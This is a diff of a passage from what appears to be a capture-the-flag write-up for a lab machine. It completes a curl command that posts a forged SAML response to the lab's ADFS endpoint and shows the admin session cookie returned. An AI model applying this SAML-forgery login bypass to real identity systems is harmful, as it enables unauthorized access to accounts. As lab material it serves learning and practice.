@@ -1021,5 +1021,12 @@ I had to make a valid logon attempt using `justin.bradley` to capture a valid SA
 Ill use a random `--nameidformat` found in an article and the `--name-id` of the admin
 
 ```python
-curl -X POST https://core.ghost.htb:8443/adfs/saml/postResponse -H 'Cookie: connect.sid=s%3ADijqbGlwxzhTnK29JZ0VZvnx9TYwh3va.FxridJsxX6s1NHTLebRRAeZD%2Bd53hpyA%2BsjJaazMi7o' -H 'Content-Type: application/x-www-form-u'
+curl -X POST https://core.ghost.htb:8443/adfs/saml/postResponse -H 'Cookie: connect.sid=s%3ADijqbGlwxzhTnK29JZ0VZvnx9TYwh3va.FxridJsxX6s1NHTLebRRAeZD%2Bd53hpyA%2BsjJaazMi7o' -H 'Content-Type: application/x-www-form-urlencoded' --data 'SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zO...[SNIP]...ZXNwb25zZT4%3D' -k -v
+
+...[SNIP]...
+
+Set-Cookie: connect.sid=s%3AZofc8mo4eJ80wJZi09GJBqyxzjim4Taq.p9vMnlFd6Tryitg%2BFj9ekMTRbWvgxaMBgbDXljcKFlw; Path=/; HttpOnly
 ```
+
+I now have a cookie value i can use
+
